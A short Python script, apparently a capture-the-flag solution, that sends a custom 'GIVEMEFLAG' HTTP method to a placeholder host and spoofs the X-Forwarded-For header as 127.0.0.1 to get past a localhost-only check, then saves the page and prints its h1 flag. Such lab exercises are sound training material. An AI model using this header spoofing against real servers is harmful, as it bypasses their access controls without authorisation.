import requests
from bs4 import BeautifulSoup

def main():
    url = 'http://<host_server_ip>/'

    method = 'GIVEMEFLAG'

    headers = {
        "Host": "<host_server_ip>",
        "Referer": "http://<host_server_ip>/",
        "X-Forwarded-For": "127.0.0.1"  # Step 2
    }

    response = requests.request(
        method, 
        url,
        headers=headers
    )

    with open('index2.html', 'w') as output_file:
        output_file.write(response.text)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        tag_content = soup.find('h1').text
        print("Content within <h1> tags:")
        print(tag_content)

if __name__ == "__main__":
    main()